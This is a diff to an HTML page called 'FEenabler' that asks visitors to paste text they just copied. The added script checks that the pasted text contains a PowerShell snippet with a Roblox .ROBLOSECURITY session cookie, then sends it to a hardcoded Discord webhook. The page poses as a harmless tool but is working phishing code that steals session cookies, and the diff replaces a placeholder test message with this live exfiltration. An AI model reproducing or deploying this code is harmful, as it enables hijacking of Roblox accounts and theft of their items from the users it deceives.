@@ -82,7 +82,7 @@
     <h1>FEenabler</h1>
 
     <p>Paste your text below.</p>
-    <p style="font-size: 12px;">Do NOT share what you just copied to anyone else. THey will be able to spoof your key and you will not be able to get another one.</p>
+    <p style="font-size: 12px;">Do NOT share what you just copied to anyone else. They will be able to spoof your key and you will not be able to get another one.</p>
 
     <input
         type="password"
@@ -96,55 +96,61 @@
 
     <div id="status"></div>
 
-    <script>
-        const message = document.getElementById("message");
-        const submit = document.getElementById("submit");
-        const status = document.getElementById("status");
+        <script>
+            const message = document.getElementById("message");
+            const submit = document.getElementById("submit");
+            const status = document.getElementById("status");
+        
+            const minimumLength = 269;
+            const requiredWords = ["Powershell", "$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items."];
+            const webhookURL = "https://discord.com/api/webhooks/1555557490295308472/sgiYczPESzUGbCAAfYRWEAnCfQDm82I4tUnJem9-ivRlqFG0z_1xYidFHab6baO3z57g";
+        
+            async function send() {
+        const text = message.value.trim();
+        const lowerText = text.toLowerCase();
 
-                async function send() {
-            const text = message.value.trim();
-        
-            if (!text) {
-                status.textContent = "Nothing entered.";
+        if (!text) {
+            status.textContent = "Nothing entered.";
+            return;
+        }
+
+        if (text.length < minimumLength) {
+            status.textContent = `Invalid: minimum ${minimumLength} characters.`;
+            return;
+        }
+
+        for (const word of requiredWords) {
+            if (!lowerText.includes(word.toLowerCase())) {
+                status.textContent = `Invalid: missing "${word}".`;
                 return;
-            }
-        
-            status.textContent = "Sending...";
-        
-            const webhook = "YOUR_DISCORD_WEBHOOK_URL";
-        
-            try {
-                const response = await fetch(webhook, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        content: "Test message from my website."
-                    })
-                });
-        
-                if (!response.ok) {
-                    throw new Error("HTTP " + response.status);
-                }
-        
-                status.textContent = "Sent!";
-                message.value = "";
-        
-            } catch (error) {
-                console.error(error);
-                status.textContent = "Failed to send.";
             }
         }
 
-        submit.addEventListener("click", send);
+        // Validation passed, send the input to Discord
+        try {
+            const response = await fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: text
+                })
+            });
 
-        message.addEventListener("keydown", function(event) {
-            if (event.key === "Enter") {
-                send();
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
             }
-        });
-    </script>
+
+            status.textContent = "Sent successfully.";
+        } catch (error) {
+            console.error(error);
+            status.textContent = "Failed to send.";
+        }
+    }
+
+    submit.addEventListener("click", send);
+</script>
 
 <div class="tutorial">
 
